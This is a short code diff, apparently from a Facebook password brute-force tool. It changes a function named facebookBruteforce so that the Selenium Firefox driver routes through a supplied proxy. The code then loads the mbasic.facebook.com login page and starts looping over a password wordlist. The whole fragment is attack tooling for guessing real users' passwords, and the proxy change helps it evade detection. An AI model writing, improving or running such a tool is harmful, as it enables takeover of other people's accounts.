@@ -38,7 +38,7 @@ def facebookBruteforce(username, wordlist, delay, https_proxy):
             'sslProxy': proxy1,
             'noProxy': '',
         })
-        driver = webdriver.Firefox()
+        driver = webdriver.Firefox(proxy=proxy)
     driver.get("https://mbasic.facebook.com/login")
     wordlist = open(wordlist, 'r')
     for i in wordlist.readlines():
